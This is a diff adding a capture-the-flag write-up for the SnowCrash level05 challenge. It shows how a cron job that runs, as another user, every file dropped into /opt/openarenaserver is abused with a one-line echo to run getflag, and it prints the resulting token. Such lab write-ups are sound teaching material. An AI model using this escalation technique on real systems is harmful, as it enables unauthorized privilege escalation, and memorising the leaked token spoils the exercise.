@@ -1,0 +1,57 @@
+Using the technique of the Level01 we get the following result : 
+
+level05@SnowCrash:~$ find / -user flag05 2> /dev/null 
+/usr/sbin/openarenaserver
+/rofs/usr/sbin/openarenaserver
+
+Both of the files contains the same shell script which is :
+
+-----------------------------------------------------------
+level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
+#!/bin/sh
+
+for i in /opt/openarenaserver/* ; do
+        (ulimit -t 5; bash -x "$i")
+        rm -f "$i"
+done
+-----------------------------------------------------------
+
+The code is straight forward :
+
+Gets all file of the directory /opt/openarenaserver/ 
+Set the CPU time limit to 5 Seconds
+Execute the file that is being processed
+Delete the file
+
+When we create a simple file in /opt/openarenaserver and execute the program /usr/sbin/openarenaserver it says the following :
+
+level05@SnowCrash:~$ /usr/sbin/openarenaserver
+bash: /usr/sbin/openarenaserver: Permission denied
+
+So we do not have the correct writes.
+
+We also have a file called level05 that is found by  the following command :
+
+level05@SnowCrash:~$ find / -name level05 2> /dev/null 
+/var/mail/level05
+/rofs/var/mail/level05
+
+This file contains the following content
+
+level05@SnowCrash:~$ cat /var/mail/level05
+*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+
+It looks like a cron job and according to crontab.guru our command means execute the command sh /usr/sbin/openarenaserver with the permission of flag05 every 2 minutes.
+
+This means that each 2 minutes the script /usr/sbin/openarenaserver is getting executed.
+
+So all we need to do is just put a shell script file that will call and save the output of the command getflag and wait for 2 minutes.
+
+We can use the following command to create our script in /opt/openarenaserver/ :
+
+echo '/bin/getflag > /tmp/flag05' > /opt/openarenaserver/getflag05
+
+And this will create a file called flag05 in the directort /tmp and when wee see the content of the flag05 file we get :
+
+level05@SnowCrash:~$ cat /tmp/flag05
+Check flag.Here is your token : viuaaale9huek52boumoomioc
